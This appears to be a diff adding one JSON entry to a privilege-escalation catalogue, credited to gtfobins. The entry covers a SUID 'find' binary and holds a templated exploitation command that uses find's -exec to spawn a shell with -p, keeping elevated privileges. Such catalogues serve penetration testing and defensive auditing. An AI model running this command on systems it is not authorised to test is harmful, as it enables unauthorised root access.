@@ -1,0 +1,18 @@
+{
+  "id": "suid_find",
+  "category": "SUID_GTFOBINS",
+  "binary": "find",
+  "cve": null,
+  "exploitation": [
+    "{{binary}} . -exec {{shell}} -p \\; -quit"
+  ],
+  "post_exploit": [
+    "id"
+  ],
+  "source": "gtfobins.github.io",
+  "tags": [
+    "suid",
+    "gtfobins"
+  ],
+  "severity": "high"
+}
